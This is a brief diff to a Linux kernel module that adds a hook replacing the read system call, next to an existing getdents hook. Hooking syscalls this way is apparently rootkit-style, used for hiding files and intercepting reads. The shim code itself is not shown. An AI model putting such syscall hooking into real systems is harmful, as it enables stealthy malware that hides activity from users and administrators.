@@ -2,6 +2,7 @@
 #include "rw.h"
 #include "syscall.h"
 #include "utility.h"
+#include "readShim.h"
 
 //new system calls
 #include "getdentsShim.h"
@@ -21,6 +22,7 @@ int init_module() {
 
 	//shim the syscalls
 	patch(SYS_getdents, getdentsShim);
+	patch(SYS_read, readShim);
 
 	printk(KERN_INFO "Module loaded\n");
 	return 0;
